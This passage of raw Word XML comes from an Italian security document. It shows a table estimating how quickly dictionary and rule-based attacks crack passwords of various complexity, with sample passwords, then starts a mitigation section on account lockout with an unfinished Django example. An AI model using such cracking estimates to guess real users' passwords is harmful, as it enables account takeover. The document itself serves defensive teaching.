            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">Molto Basso (parole da </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>dizionario</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> standard)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2023" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="13614C62" w14:textId="47005C15" w:rsidR="002F0F19" w:rsidRPr="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="00E07933">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>Juventus, Francesco, Napoli</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1986" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="16BC079F" w14:textId="200798BC" w:rsidR="002F0F19" w:rsidRPr="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="00E07933">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>5000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1987" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="467D2532" w14:textId="7C40D8A6" w:rsidR="002F0F19" w:rsidRPr="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="00E07933">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">21 </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>minuti</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2860" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4A08BF1D" w14:textId="7E4594B5" w:rsidR="002F0F19" w:rsidRPr="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="00E07933">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">Molto </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>efficace</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">: </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>una</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>parte</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> delle password </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>comuni</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>viene</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>trovata</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>rapidamente</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002F0F19" w:rsidRPr="002F0F19" w14:paraId="181ACFA4" w14:textId="77777777" w:rsidTr="002F0F19">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2484" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="13908218" w14:textId="20F2B3F2" w:rsidR="002F0F19" w:rsidRPr="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="00E07933">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>Basso (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>parola</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> + anno o </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>mutazione</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> semplice)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2023" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="29DB95DB" w14:textId="2E4581F5" w:rsidR="002F0F19" w:rsidRPr="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="00E07933">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>Mamma1990, Sole2026</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1986" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6810C2CE" w14:textId="6A009368" w:rsidR="002F0F19" w:rsidRPr="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="00E07933">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>1.000.000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1987" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="660E4747" w14:textId="1E9EEECB" w:rsidR="002F0F19" w:rsidRPr="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="00E07933">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>7 ore</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2860" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4CD164F4" w14:textId="699D54EF" w:rsidR="002F0F19" w:rsidRPr="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="002F0F19">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">Ancora </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>alta</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">: le </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>regole</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>automatiche</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> di </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>mutazione</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>individuano</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>rapidamente</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>alcuni</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>schemi</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002F0F19" w:rsidRPr="002F0F19" w14:paraId="54AA75A1" w14:textId="77777777" w:rsidTr="002F0F19">
        <w:trPr>
          <w:trHeight w:val="426"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2484" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="579C88BD" w14:textId="724C2ED1" w:rsidR="002F0F19" w:rsidRPr="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="00E07933">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>Medio (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>parola</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>complessa</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> + </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>regole</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> Let Speak)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2023" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2B36A369" w14:textId="62BCB958" w:rsidR="002F0F19" w:rsidRPr="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="00E07933">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>Ju23</w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>tnu!,</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> B3lliasim0!</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1986" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6A27CA6F" w14:textId="28A38A34" w:rsidR="002F0F19" w:rsidRPr="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="00E07933">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>5.000.000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1987" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="138DF59E" w14:textId="719BAC3B" w:rsidR="002F0F19" w:rsidRPr="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="00E07933">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">14,5 </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>giorni</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2860" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="48147A73" w14:textId="6ACAC504" w:rsidR="002F0F19" w:rsidRPr="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="00E07933">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>Possibile</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> ma </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>meno</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>pratico</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">: </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>richiede</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>dizionari</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>avanzati</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> e </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>regole</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> di </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>trasformazione</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="68657346" w14:textId="77777777" w:rsidR="002F0F19" w:rsidRDefault="00E07933" w:rsidP="002F0F19">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="002F0F19">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F5597"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidR="002F0F19" w:rsidRPr="002F0F19">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F5597"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidRPr="002F0F19">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F5597"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="002F0F19" w:rsidRPr="002F0F19">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F5597"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Mitigazioni</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="470A3E07" w14:textId="0390E31D" w:rsidR="002F0F19" w:rsidRPr="00E603E1" w:rsidRDefault="002F0F19" w:rsidP="002F0F19">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
          <w:bCs/>
          <w:color w:val="5B9BD5"/>
          <w:sz w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E603E1">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
          <w:bCs/>
          <w:color w:val="5B9BD5"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>1. Bloccare l’account dopo N tentativi falliti</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EFA6F27" w14:textId="77777777" w:rsidR="002F0F19" w:rsidRPr="00E603E1" w:rsidRDefault="002F0F19" w:rsidP="002F0F19">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Descrizione</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1887187E" w14:textId="77777777" w:rsidR="002F0F19" w:rsidRPr="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="002F0F19">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002F0F19">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Se un utente sbaglia la password più di 5 volte entro un certo intervallo, blocca il login per un periodo (es. 5 minuti).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11C34DDA" w14:textId="77777777" w:rsidR="002F0F19" w:rsidRPr="00E603E1" w:rsidRDefault="002F0F19" w:rsidP="002F0F19">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Esempio Django (middleware / view)</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Grigliatabella"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblInd w:w="38" w:type="dxa"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9932"/>
      </w:tblGrid>
      <w:tr w:rsidR="002F0F19" w14:paraId="58BF44DB" w14:textId="77777777" w:rsidTr="00E603E1">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9932" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="nil"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
          </w:tcPr>
          <w:p w14:paraId="67C1E6E6"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from </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>django.utils</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve"> import </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>timezone</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
          <w:p w14:paraId="14C403BD"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from datetime import </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
